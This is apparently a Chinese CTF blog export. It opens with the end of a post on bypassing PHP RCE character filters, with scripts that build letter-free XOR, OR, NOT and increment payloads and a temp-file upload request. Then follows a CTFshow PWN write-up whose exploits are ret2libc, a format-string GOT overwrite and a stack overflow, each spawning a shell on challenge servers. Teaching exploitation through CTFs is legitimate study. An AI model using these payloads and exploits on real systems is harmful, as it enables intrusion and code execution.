<p>然后构造出system字符串拿flag。</p>
<h1 id="异或→EXP"><a href="#异或→EXP" class="headerlink" title="异或→EXP"></a>异或→EXP</h1><p>为了应对多种情况，放个羽师傅的脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">$myfile = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">$contents=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123; </span><br><span class="line">  <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;<span class="number">256</span> ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($i&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      $hex_i=<span class="string">&#x27;0&#x27;</span>.dechex($i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      $hex_i=dechex($i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      $hex_j=<span class="string">&#x27;0&#x27;</span>.dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      $hex_j=dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">    $preg = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; //根据题目给的正则表达式修改即可</span><br><span class="line">    <span class="keyword">if</span>(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">          echo <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="string">&#x27;%&#x27;</span>.$hex_i;</span><br><span class="line">    $b=<span class="string">&#x27;%&#x27;</span>.$hex_j;</span><br><span class="line">    $c=(urldecode($a)^urldecode($b));</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ord</span>($c)&gt;=<span class="number">32</span>&amp;<span class="built_in">ord</span>($c)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">      $contents=$contents.$c.<span class="string">&quot; &quot;</span>.$a.<span class="string">&quot; &quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[+] your <span class="function"><span class="keyword">function</span>：<span class="title">system</span></span></span><br><span class="line"><span class="function">[+] <span class="title">your</span> <span class="title">command</span>：<span class="title">ls</span></span></span><br><span class="line"><span class="function">(<span class="params"><span class="string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7c%60%60&quot;</span></span>)(<span class="params"><span class="string">&quot;%0c%08&quot;</span>^<span class="string">&quot;%60%7b&quot;</span></span>)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<p>现在了解了异或，继续拓展思维，既然异或可以，那么或，取反，自增，中文是不是也可以得到我们的结果呢。</p>
<h1 id="或→EXP"><a href="#或→EXP" class="headerlink" title="或→EXP"></a>或→EXP</h1><p>原理一样，都是通过16进制比对得到特定字符，上脚本。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">    <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">      <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="取反→EXP"><a href="#取反→EXP" class="headerlink" title="取反→EXP"></a>取反→EXP</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="自增→EXP"><a href="#自增→EXP" class="headerlink" title="自增→EXP"></a>自增→EXP</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$precode</span> = <span class="string">&lt;&lt;&lt;code</span></span><br><span class="line"><span class="string">\$_=(&#x27;@&#x27;^&#x27;!&#x27;); //a</span></span><br><span class="line"><span class="string">\$___=++<span class="subst">$__</span>; //b</span></span><br><span class="line"><span class="string">\$____=++<span class="subst">$___</span>; //c</span></span><br><span class="line"><span class="string">\$_____=++<span class="subst">$____</span>; //d</span></span><br><span class="line"><span class="string">\$______=++<span class="subst">$_____</span>; //e</span></span><br><span class="line"><span class="string">\$_______=++<span class="subst">$______</span>; //f</span></span><br><span class="line"><span class="string">\$________=++<span class="subst">$_______</span>; //g</span></span><br><span class="line"><span class="string">\$_________=++<span class="subst">$________</span>; //h</span></span><br><span class="line"><span class="string">\$__________=++<span class="subst">$_________</span>; //i</span></span><br><span class="line"><span class="string">\$___________=++<span class="subst">$__________</span>; //g</span></span><br><span class="line"><span class="string">\$____________=++<span class="subst">$___________</span>; //k</span></span><br><span class="line"><span class="string">\$_____________=++<span class="subst">$____________</span>; //l</span></span><br><span class="line"><span class="string">\$______________=++<span class="subst">$_____________</span>; //m</span></span><br><span class="line"><span class="string">\$_______________=++<span class="subst">$______________</span>; //n</span></span><br><span class="line"><span class="string">\$________________=++<span class="subst">$_______________</span>; //o</span></span><br><span class="line"><span class="string">\$_________________=++<span class="subst">$________________</span>; //p</span></span><br><span class="line"><span class="string">\$__________________=++<span class="subst">$_________________</span>; //q</span></span><br><span class="line"><span class="string">\$___________________=++<span class="subst">$__________________</span>; //r</span></span><br><span class="line"><span class="string">\$____________________=++<span class="subst">$___________________</span>; //s</span></span><br><span class="line"><span class="string">\$_____________________=++<span class="subst">$____________________</span>; //t</span></span><br><span class="line"><span class="string">\$______________________=++<span class="subst">$_____________________</span>; //u</span></span><br><span class="line"><span class="string">\$_______________________=++<span class="subst">$______________________</span>; //v</span></span><br><span class="line"><span class="string">\$________________________=++<span class="subst">$_______________________</span>; //w</span></span><br><span class="line"><span class="string">\$_________________________=++<span class="subst">$________________________</span>; //x</span></span><br><span class="line"><span class="string">\$__________________________=++<span class="subst">$_________________________</span>; //y</span></span><br><span class="line"><span class="string">\$___________________________=++<span class="subst">$__________________________</span>; //z</span></span><br><span class="line"><span class="string">\$_=(&#x27;@&#x27;^&#x27;!&#x27;);</span></span><br><span class="line"><span class="string">code</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$precode</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用异或生成任意无字母无数字代码</span></span><br><span class="line">Function <span class="title function_ invoke__">createCode</span>(<span class="variable">$code</span>)&#123;</span><br><span class="line">         <span class="keyword">global</span> <span class="variable">$precode</span>;</span><br><span class="line">         <span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">         <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                 <span class="variable">$c</span> = <span class="variable">$code</span>[<span class="variable">$i</span>];</span><br><span class="line">                 <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;<span class="number">97</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;<span class="number">122</span>)&#123;</span><br><span class="line">                         <span class="variable">$ret</span> .= <span class="string">&quot;<span class="subst">$c</span>&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span>&#123;</span><br><span class="line">                         <span class="variable">$ret</span> .= <span class="string">&#x27;$&#x27;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)-<span class="number">96</span>); </span><br><span class="line">                 &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;precode(\&quot;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$ret</span>,<span class="number">0</span>,<span class="title function_ invoke__">stripos</span>(<span class="variable">$ret</span>, <span class="string">&quot;(&quot;</span>)).<span class="string">&quot;\&quot;)&quot;</span>).str</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">createCode</span>(<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h1><p>具体原理可以看p神文章</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure>


<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>除这些之外我们还可以这样用$</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>奇技淫巧</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-PWN部分题</title>
    <url>/PWN/ctfshow%E9%83%A8%E5%88%86PWN%E9%A2%98/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随手玩了下，就随手写个WP。</p>
<span id="more"></span>

<h1 id="ctfshow-pwn03"><a href="#ctfshow-pwn03" class="headerlink" title="ctfshow-pwn03"></a>ctfshow-pwn03</h1><p>分析一下附件：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_IcUtzNnPDQ.png"></p>
<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_cGpj3tpkkZ.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gBccWcEN1U.png"></p>
<p>pwnme函数出fgets接受100个字节，但是s只开辟了9个字节.<code>存在栈溢出</code> 。</p>
<p>接着就是找到<code>system函数</code>的位置了。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gW1afFLyLC.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_GI01GR64v2.png"></p>
<p>但是都没有发现<code>system函数</code>和<code>&#39;/bin/sh&#39;</code> 。</p>
<p>经过一番研究之后，要用到<code>plt表</code>和<code>got表</code></p>
<h2 id="关键知识点"><a href="#关键知识点" class="headerlink" title="关键知识点"></a>关键知识点</h2><ul>
<li><p>全局偏移表<code>（GOT：Global Offset Table）</code>存放外部的函数地址 &amp;#x20;</p>
</li>
<li><p>程序链接表<code>（PLT：Procedure Link Table）</code>存放额外代码</p>
</li>
<li><p>延迟绑定：只有动态库函数在被调用时，才会地址解析和重定位工作</p>
</li>
<li><p>程序执行后，plt表里是got表的地址，got表是函数的真实地址 &amp;#x20;</p>
</li>
<li><p>程序还未执行时，got表里还是plt表的地址</p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_HTib7wBlVm.png"></p>
<p>由上可知，需要泄露got表里面的地址，但是由于开启了ASLR<code>本地和远程的地址不一样</code>。</p>
<p>但也只是针对于地址中间位进行随机，最低的12位并不会发生改变；</p>
<p>也就是需要获取到远程环境的函数的真实地址；</p>
<p>进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与&#x2F;bin&#x2F;sh的偏移，最终getshell</p>
<h2 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h2><p>首先栈溢出，利用puts函数的plt表的地址，泄漏puts函数的got表中的函数的真实地址,然后返回地址填写main函数重新跳转回来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_meZGx1HRox.png"></p>
<p>得到system函数的真实地址<code>0xf7e274e0</code></p>
<p>传两个<code>\n\n</code> 原因是u32是将字符转换为小端序。</p>
<p>当知道了<code>puts函数的真实地址</code>之后就可以<code>根据后三位判断libc的版本</code></p>
<p><a href="https://libc.blukat.me/" title="Libc">Libc</a></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_F63vef98Uk.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libcbase = get_addr - <span class="number">0x067360</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x03cd10</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>,system_addr,<span class="string">b&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>完整EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br><span class="line"></span><br><span class="line">libcbase = get_addr - <span class="number">0x067360</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x03cd10</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>,system_addr,<span class="string">b&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_VNcHQCRYWk.png"></p>
<h1 id="ctfshow-pwn04"><a href="#ctfshow-pwn04" class="headerlink" title="ctfshow-pwn04"></a>ctfshow-pwn04</h1><p>关键点绕canary</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_JUsZ5bUO6p.png"></p>
<p>打开了canary，栈不可执行。</p>
<p>canary的原理是：在栈的ebp下面放一个随机数，<strong>在函数返回之前会检查这个数有没有被修改</strong>，就可以检测是否发生栈溢出了，因此 <code>在一个函数最后位置对ebp的操作，就是canary做的操作。</code></p>
<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_hRIPLi0k50.png"></p>
<p>printf函数没有格式化输出，很好字符串格式化漏洞出来了。</p>
<p>可以<strong>将printf函数的got表地址修改为system函数的内存地址</strong>，结果是当程序执行到printf函数时，其实是执行的system函数，而程序正好有两次输入输出，可以在第一次输入时篡改printf函数，到第二次输入时，我们只用传进去<code>/bin/sh</code>，那么程序在执行<code>printf(&amp;buf)</code>时，实际执行的却是<code>system(&#39;/bin/sh&#39;)</code>。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./ex2&quot;)</span></span><br><span class="line">sh = remote(<span class="string">b&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28110</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ex2&quot;</span>)</span><br><span class="line">printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf:system&#125;)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;Hacker!\n&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;/bin/sh\n&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_YAVR191ejr.png"></p>
<h1 id="ctfshow-pwn05"><a href="#ctfshow-pwn05" class="headerlink" title="ctfshow-pwn05"></a>ctfshow-pwn05</h1><p>经典栈溢出，直接给EXP了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./ex2&quot;)</span></span><br><span class="line">sh = remote(<span class="string">b&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28061</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;getFlag&#x27;</span>]</span><br><span class="line"><span class="comment"># system = 0x8048486</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x14</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + p32(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

